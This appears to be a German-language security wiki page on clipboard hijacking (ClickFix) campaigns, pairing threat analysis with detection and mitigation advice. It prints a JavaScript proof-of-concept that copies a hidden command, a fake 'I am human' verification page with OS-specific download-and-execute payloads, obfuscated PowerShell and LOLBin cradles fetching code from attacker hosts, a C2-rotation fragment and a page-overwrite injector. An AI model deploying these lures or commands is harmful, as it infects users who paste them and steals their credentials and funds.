# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – old but still valid advice

## Überblick

Clipboard hijacking – auch bekannt als *pastejacking* – missbraucht die Tatsache, dass Benutzer regelmäßig Befehle kopieren und einfügen, ohne sie zu überprüfen. Eine bösartige Web-Seite (oder jeder JavaScript-fähige Kontext wie eine Electron- oder Desktop-Anwendung) schreibt programmgesteuert vom Angreifer kontrollierten Text in die System-Clipboard. Opfer werden normalerweise durch sorgfältig formulierte Social-Engineering-Anweisungen dazu gebracht, **Win + R** (Run-Dialog), **Win + X** (Quick Access / PowerShell) zu drücken oder ein Terminal zu öffnen und den Inhalt der Clipboard *einzufügen*, wodurch sofort beliebige Befehle ausgeführt werden.

Da **keine Datei heruntergeladen und kein Anhang geöffnet wird**, umgeht die Technik die meisten E-Mail- und Web-Content-Sicherheitskontrollen, die Anhänge, Makros oder direkte Befehlsausführung überwachen. Der Angriff ist daher in Phishing-Kampagnen beliebt, die Commodity-Malware-Familien wie NetSupport RAT, Latrodectus loader oder Lumma Stealer ausliefern.

## Wallet-address replacement clippers

Eine weitere Variante von **clipboard hijacking** fügt überhaupt keine Befehle ein: Sie wartet, bis das Opfer eine **cryptocurrency wallet address** kopiert, und ersetzt sie dann lautlos kurz vor dem Einfügen durch eine vom Angreifer kontrollierte Adresse. Das ist besonders effektiv gegen lange Wallet-Formate, da Benutzer oft nur die ersten/letzten Zeichen prüfen.

Häufige Merkmale aus der Praxis:
- **Thin loader + nested payload**: Die sichtbare App/exe sieht wie ein legitimes Trading- oder "profit"-Tool aus, während der eigentliche clipper tiefer im Bundle verborgen ist (zum Beispiel ein .NET loader, der eine verschachtelte Rust payload startet).
- **Regex-driven replacement**: Die Malware erkennt Zeichenfolgen wie `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` oder sogar generische **44-character Solana-like** strings und schreibt sie zu Angreifer-Wallets um.
- **Wallet rotation at scale**: Moderne Windows-Samples können **tausende** Ersatz-Wallets pro Währung einbetten, statt einer einzigen statischen Adresse, wodurch der Wallet-Reputationsverlust nach jedem Diebstahl reduziert wird.

### Windows clipper flow

Eine häufige Implementierung ist ein verborgenes Fenster, das mit **`AddClipboardFormatListener`** registriert wird. Bei jeder Clipboard-Aktualisierung ruft die Malware typischerweise auf:
- **`OpenClipboard`** → auf die aktuellen Clipboard-Daten zugreifen.
- **`GetClipboardData`** → Text lesen.
- **`EmptyClipboard`** + **`SetClipboardData`** → die Wallet-Zeichenfolge durch den Angreiferwert ersetzen.

Minimal hunting regexes frequently seen in clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Benutzer-Level-Persistenz reicht für den Impact aus. Ein beobachtetes Muster ist:
- Payload nach **`%APPDATA%\silke\silke.exe`** kopieren
- Eine **Startup-folder LNK** unter `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` erstellen

Detection-Ideen:
- Prozesse, die kontinuierlich clipboard APIs aufrufen und gleichzeitig unter `%APPDATA%` und dem Benutzer-**Startup**-Ordner schreiben.
- Neue LNK-/Executable-Erstellung, gefolgt von wallet-address clipboard rewrites.
- Archive oder fake-software Bundles mit vielen ungenutzten Dateien plus einem kleinen Launcher, der eine verschachtelte Binary startet.

### macOS social-engineered quarantine removal + LaunchAgent persistence

Auf macOS liefern einige Kampagnen einen **`unlocker.command`**-Helper aus und weisen das Opfer an, mit Rechtsklick → **Open** zu wählen, wenn Gatekeeper meldet, dass die App beschädigt ist oder von einem nicht identifizierten Entwickler stammt. Das Skript entfernt einfach die quarantine und startet die benachbarte `.app`:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Dies ist **kein** Gatekeeper-Exploit; es ist ein **sozial konstruiertes quarantine bypass**, das die Tatsache ausnutzt, dass Gatekeeper-Entscheidungen vom `com.apple.quarantine` xattr abhängen.

Nach der Ausführung kann sich der clipper als aktueller Benutzer persistieren, indem er Folgendes schreibt:
- **`~/launch.sh`** – Wrapper-Skript
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent mit `RunAtLoad` und `KeepAlive`

Ein nützliches defensives Detail ist, dass einige Samples einen **Self-Healing Watchdog** implementieren, der LaunchAgent und Wrapper etwa alle 30 Sekunden neu schreibt. Wenn du zuerst das plist entfernst **ohne den laufenden Prozess zu beenden**, kann die Malware es sofort neu erstellen. Sichere Bereinigungsreihenfolge:
1. Den aktiven clipper-Prozess beenden.
2. Das LaunchAgent-plist entladen/löschen.
3. `~/launch.sh` und die kopierte Nutzlast löschen.

### Lieferhinweis: gefälschte Reputation als Verstärker

Für diese Familie kann die Malware selbst technisch einfach bleiben, während die **Distributionsebene** die eigentliche Arbeit übernimmt: gefälschte GitHub-Stars/Forks, SourceForge-Bewertungen/Downloads, YouTube-Tutorial-Kommentare/-Aufrufe und harmlos wirkende VirusTotal-Kommentare/-Stimmen werden genutzt, um die Binary vor der Ausführung vertrauenswürdig erscheinen zu lassen.

## Erzwungene Copy-Buttons und versteckte Nutzlasten (macOS one-liners)

Einige macOS-Infostealer klonen Installer-Sites (z. B. Homebrew) und **erzwingen die Nutzung eines „Copy“-Buttons**, damit Nutzer nicht nur den sichtbaren Text markieren können. Der Clipboard-Eintrag enthält den erwarteten Installer-Befehl plus eine angehängte Base64-Nutzlast (z. B. `...; echo <b64> | base64 -d | sh`), sodass ein einzelnes Einfügen beides ausführt, während die UI die zusätzliche Stufe verbirgt.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Ältere Kampagnen nutzten `document.execCommand('copy')`, neuere setzen auf die asynchrone **Clipboard API** (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Flow

1. User besucht eine typosquattete oder kompromittierte Site (z. B. `docusign.sa[.]com`)
2. Eingespeistes **ClearFake**-JavaScript ruft einen `unsecuredCopyToClipboard()`-Helper auf, der unbemerkt einen Base64-kodierten PowerShell-One-Liner in die Clipboard speichert.
3. HTML-Anweisungen sagen dem Opfer: *“Press **Win + R**, paste the command and press Enter to resolve the issue.”*
4. `powershell.exe` wird ausgeführt und lädt ein Archiv herunter, das eine legitime ausführbare Datei plus eine bösartige DLL enthält (klassisches DLL sideloading).
5. Der Loader entschlüsselt zusätzliche Stages, injiziert shellcode und installiert Persistence (z. B. scheduled task) – und führt letztlich NetSupport RAT / Latrodectus / Lumma Stealer aus.

### Beispiel NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimes Java WebStart) durchsucht sein Verzeichnis nach `msvcp140.dll`.
* Die bösartige DLL löst APIs dynamisch mit **GetProcAddress** auf, lädt zwei Binärdateien (`data_3.bin`, `data_4.bin`) über **curl.exe** herunter, entschlüsselt sie mit einem Rolling-XOR-Schlüssel `"https://google.com/"`, injiziert das finale Shellcode und entpackt **client32.exe** (NetSupport RAT) nach `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Lädt `la.txt` mit **curl.exe** herunter
2. Führt den JScript-Downloader in **cscript.exe** aus
3. Ruft ein MSI-Payload ab → legt `libcef.dll` neben einer signierten Anwendung ab → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Der **mshta**-Aufruf startet ein verborgenes PowerShell-Skript, das `PartyContinued.exe` abruft, `Boat.pst` (CAB) extrahiert, `AutoIt3.exe` mittels `extrac32` und Dateizusammenführung rekonstruiert und schließlich ein `.a3x`-Skript ausführt, das Browser-Zugangsdaten an `sumeriavgv.digital` exfiltriert.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Einige ClickFix-Kampagnen verzichten vollständig auf Datei-Downloads und weisen Opfer an, einen One-Liner einzufügen, der JavaScript über WSH abruft und ausführt, es persistiert und das C2 täglich rotiert. Beispielhafte beobachtete Kette:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Wesentliche Merkmale
- Obfuskierte URL wird zur Laufzeit umgekehrt, um eine oberflächliche Prüfung zu erschweren.
- JavaScript persistiert sich über eine Startup LNK (WScript/CScript) und wählt das C2 nach dem aktuellen Tag aus – das ermöglicht eine schnelle Domain-Rotation.

Minimales JS-Fragment, das C2s nach Datum rotiert:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Die nächste Phase setzt üblicherweise einen Loader ein, der Persistenz herstellt und ein RAT zieht (z. B. PureHVNC), oft mit TLS-Pinning gegen ein hartcodiertes Zertifikat und Chunking des Traffics.

Detection-Ideen speziell für diese Variante
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (oder `cscript.exe`).
- Startup-Artefakte: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` ruft WScript/CScript mit einem JS-Pfad unter `%TEMP%`/`%APPDATA%` auf.
- Registry/RunMRU und Command-line-Telemetrie mit `.split('').reverse().join('')` oder `eval(a.responseText)`.
- Wiederholtes `powershell -NoProfile -NonInteractive -Command -` mit großen stdin-Payloads, um lange Skripte ohne lange Command lines zu füttern.
- Scheduled Tasks, die anschließend LOLBins wie `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` unter einer updater-ähnlichen Task-/Pfadstruktur ausführen (z. B. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Täglich rotierende C2-Hostnames und URLs mit `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`-Muster.
- Clipboard-Write-Events mit anschließendem Win+R-Paste und direkt danach `powershell.exe`-Ausführung korrelieren.


Blue-Teams können Clipboard-, Process-Creation- und Registry-Telemetrie kombinieren, um Pastejacking-Missbrauch zu erkennen:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` speichert einen Verlauf von **Win + R**-Commands – nach ungewöhnlichen Base64- / obfuskierten Einträgen suchen.
* Security Event ID **4688** (Process Creation), bei dem `ParentImage` == `explorer.exe` und `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } liegt.
* Event ID **4663** für File-Creations unter `%LocalAppData%\Microsoft\Windows\WinX\` oder temporären Ordnern direkt vor dem verdächtigen 4688-Event.
* EDR-Clipboard-Sensoren (falls vorhanden) – `Clipboard Write` direkt gefolgt von einem neuen PowerShell-Prozess korrelieren.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Aktuelle Kampagnen erzeugen massenhaft gefälschte CDN-/Browser-Verifizierungsseiten ("Just a moment…", IUAM-style), die Nutzer dazu bringen, OS-spezifische Commands aus ihrer Zwischenablage in native Consolen zu kopieren. Dadurch wird die Ausführung aus der Browser-Sandbox heraus verlagert und funktioniert unter Windows und macOS.

Wichtige Merkmale der vom Builder generierten Seiten
- OS-Erkennung via `navigator.userAgent`, um Payloads anzupassen (Windows PowerShell/CMD vs. macOS Terminal). Optionale Decoys/No-ops für nicht unterstützte OS erhalten die Illusion.
- Automatisches Clipboard-Copy bei harmlosen UI-Aktionen (Checkbox/Copy), während der sichtbare Text vom Inhalt der Zwischenablage abweichen kann.
- Mobile-Blocking und ein Popover mit Schritt-für-Schritt-Anweisungen: Windows → Win+R→paste→Enter; macOS → Terminal öffnen→paste→Enter.
- Optionale Obfuscation und Single-File-Injector, um das DOM einer kompromittierten Site mit einer Tailwind-gestylten Verifizierungs-UI zu überschreiben (keine neue Domain-Registrierung erforderlich).

Beispiel: Clipboard-Mismatch + OS-aware Branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS-Persistenz des ersten Starts
- Verwende `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`, damit die Ausführung nach dem Schließen des Terminals fortgesetzt wird und sichtbare Artefakte reduziert werden.

In-Place-Übernahme von Seiten auf kompromittierten Sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Erkennungs- & Hunting-Ideen speziell für IUAM-style lures
- Web: Seiten, die die Clipboard API an Verifizierungs-Widgets binden; Abweichung zwischen angezeigtem Text und Clipboard-Payload; `navigator.userAgent`-Branching; Tailwind + Single-Page-Replace in verdächtigen Kontexten.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` kurz nach einer Browser-Interaktion; Batch/MSI-Installer, die aus `%TEMP%` ausgeführt werden.
- macOS endpoint: Terminal/iTerm startet `bash`/`curl`/`base64 -d` mit `nohup` nahe bei Browser-Events; Background-Jobs, die das Schließen des Terminals überleben.
- Korrelation von `RunMRU` Win+R-Historie und Clipboard-Schreibvorgängen mit anschließender Console-Process-Erstellung.

Siehe auch unterstützende Techniken

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix-Evolutionen (ClearFake, Scarlet Goldfinch)

- ClearFake kompromittiert weiterhin WordPress-Sites und injiziert Loader-JavaScript, das externe Hosts (Cloudflare Workers, GitHub/jsDelivr) und sogar Blockchain-“etherhiding”-Aufrufe (z. B. POSTs an Binance Smart Chain API-Endpunkte wie `bsc-testnet.drpc[.]org`) verkettet, um aktuelle lure-Logik zu laden. Neuere Overlays nutzen stark fake CAPTCHAs, die Nutzer anweisen, eine One-Liner-Zeile zu copy/paste (T1204.004), statt etwas herunterzuladen.
- Die Initialausführung wird zunehmend an signierte Script-Hosts/LOLBAS delegiert. In den Chains von Januar 2026 wurde die frühere `mshta`-Nutzung durch das integrierte `SyncAppvPublishingServer.vbs`, ausgeführt via `WScript.exe`, ersetzt, wobei PowerShell-ähnliche Argumente mit Aliases/Wildcards übergeben wurden, um Remote-Content abzurufen:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` ist signiert und wird normalerweise von App-V verwendet; zusammen mit `WScript.exe` und ungewöhnlichen Argumenten (`gal`/`gcm` Aliases, Wildcard-cmdlets, jsDelivr-URLs) wird es zu einer hochsignifikanten LOLBAS-Phase für ClearFake.
- Im Februar 2026 wechselten fake CAPTCHA-Payloads zurück zu reinen PowerShell-Download-Cradles. Zwei Live-Beispiele:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Die erste Chain ist ein im Speicher laufender `iex(irm ...)` Grabber; die zweite staged über `WinHttp.WinHttpRequest.5.1`, schreibt eine temporäre `.ps1` und startet sie dann mit `-ep bypass` in einem versteckten Fenster.

Detection/Hunting-Tipps für diese Varianten
- Prozesslinie: Browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` oder PowerShell cradles direkt nach Clipboard-Writes/Win+R.
- Command-Line-Keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker Domains oder rohe IP `iex(irm ...)` Muster.
- Netzwerk: ausgehender Traffic zu CDN-Worker-Hosts oder Blockchain-RPC-Endpunkten von Script-Hosts/PowerShell kurz nach dem Web-Browsing.
- Datei/Registry: temporäre `.ps1`-Erstellung unter `%TEMP%` plus RunMRU-Einträge mit diesen One-Linern; blockiere/alertiere auf signed-script LOLBAS (WScript/cscript/mshta), die mit externen URLs oder obfuskierten Alias-Strings ausgeführt werden.

## June 2026 ClickFix tradecraft: Paste-Telemetrie, fake verification comments und LOLBin-Chaining

Jüngste Red Canary-Telemetrie zeigt, dass der stabile Indikator **nicht ein einziger exakter Befehl** ist, sondern die Kombination aus **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval** und **sofortiger Ausführung**.

### Bemerkenswerte Operator-Muster

- **Paste-Bestätigungs-Telemetrie**: Einige Payloads rufen `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` vor dem eigentlichen Stage auf. Das bestätigt die Benutzerinteraktion, während das Fenster kurz und unauffällig bleibt.
- **Fake verification comments**: PowerShell-One-Liner können Strings wie `# Security check ✔️ I'm not a robot Verification ID: 138105` anhängen, sodass der Befehl nach dem Einfügen in Run / `cmd.exe` / PowerShell-History weiterhin CAPTCHA-bezogen aussieht.
- **Dynamische URL-Rekonstruktion**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` vermeidet eine statische URL in der Command-Line, führt aber weiterhin in-memory download-and-execute aus.
- **Maskierte Installer-Ausführung**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` missbraucht ungewöhnliche Groß-/Kleinschreibung und Unicode-ähnliche Zeichen in Flags, um fragile Detections zu umgehen und trotzdem `msiexec.exe` zu ähneln.
- **Caret-escaped LOLBin-Chains**: `cmd.exe` kann Keywords mit `^`-Escapes verstecken (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), die verschachtelte Shell minimiert starten, Angreifer-Inhalt mit einer harmlosen Endung wie `.pdf` speichern und ihn dann über `mshta` ausführen.
## Mitigations

1. Browser-Härtung – Clipboard-Write-Access deaktivieren (`dom.events.asyncClipboard.clipboardItem` etc.) oder User-Geste erzwingen.
2. Security Awareness – Nutzer schulen, sensible Befehle zu *tippen* oder sie zuerst in einen Texteditor einzufügen.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control, um beliebige One-Liner zu blockieren.
4. Network Controls – ausgehende Requests zu bekannten Pastejacking- und Malware-C2-Domains blockieren.

## Related Tricks

* **Discord Invite Hijacking** missbraucht oft denselben ClickFix-Ansatz, nachdem Nutzer in einen bösartigen Server gelockt wurden:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
